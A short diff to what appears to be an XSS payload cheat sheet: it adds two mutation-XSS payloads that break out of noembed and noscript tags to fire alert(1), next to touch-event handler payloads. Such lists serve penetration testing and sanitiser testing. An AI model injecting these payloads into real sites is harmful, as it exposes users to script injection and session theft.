@@ -118,6 +118,8 @@ XSS for HTML5
 <body ontouchstart=alert(1)> // Triggers when a finger touch the screen
 <body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
 <body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
+<noembed><img src="</noembed><iframe onload=alert(1)>" /></noembed>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
 ```
 
 XSS using script tag (external payload)
